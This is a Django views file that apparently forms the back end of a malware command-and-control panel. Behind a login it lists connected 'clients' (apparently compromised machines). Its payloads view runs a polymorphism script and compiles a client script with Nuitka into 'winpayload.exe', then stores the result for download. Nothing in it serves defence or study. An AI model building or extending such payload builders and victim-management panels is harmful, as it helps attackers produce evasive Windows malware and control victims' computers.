from django.http import HttpResponse, JsonResponse
from django.template import loader
from django.shortcuts import render, redirect
from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.decorators import login_required
from django.contrib import messages
from control.models import Client, Payload
import subprocess
import os
import time


@login_required
def panel(request):
    clients = Client.objects.all()
    template = loader.get_template('panel.html')
    context = {
        'clients': clients,
    }
    return HttpResponse(template.render(context, request))

@login_required
def payloads(request):
    if request.method == 'POST':
        os_type = request.POST.get('os')
        format_type = request.POST.get('format')

        if os_type == 'windows' and format_type == 'exe':
            script_path = os.path.join(os.path.dirname(__file__), '../client/comp_nuitka.py')
            script_name = './client/polymorphic_main.py'
            exe_name = 'winpayload.exe'
            subprocess.run(['python3', './client/polymorphism.py'])
            time.sleep(3)
            subprocess.run(['python3', script_path, script_name, exe_name])

            payload_path = os.path.join('compiled_payloads', exe_name)
            payload = Payload(os=os_type, format=format_type, file_path="../../" + payload_path)
            payload.save()

            return JsonResponse({'status': 'success', 'payload_path': payload_path})

    payloads = Payload.objects.all()
    return render(request, 'payloads.html', {'payloads': payloads})

def login_view(request):
    if request.method == 'POST':
        username = request.POST['username']
        password = request.POST['password']
        user = authenticate(request, username=username, password=password)
        if user is not None:
            login(request, user)
            return redirect('panel')
        else:
            messages.error(request, 'Invalid username or password')
    return render(request, 'login.html')

def logout_view(request):
    logout(request)
    return redirect('login')